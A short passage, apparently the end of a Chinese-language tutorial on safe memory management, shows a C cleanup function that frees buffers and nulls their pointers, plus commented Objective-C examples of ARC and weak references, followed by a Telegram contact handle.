void resource_cleanup(resource_t *res) {
    if (res->buffer3) { free(res->buffer3); res->buffer3 = NULL; }
    if (res->buffer2) { free(res->buffer2); res->buffer2 = NULL; }
    if (res->buffer1) { free(res->buffer1); res->buffer1 = NULL; }
    res->initialized = 0;
}

// 5. 使用ARC和弱引用
// Objective-C中使用ARC防止内存管理错误
// 使用weak引用防止循环引用

// __weak typeof(self) weakSelf = self;
// [self.operation setCompletionHandler:^{
//     typeof(weakSelf) strongSelf = weakSelf;
//     if (!strongSelf) return;
//     [strongSelf doWork];
// }];
```

---

> 联系: telegram：@pengqing666
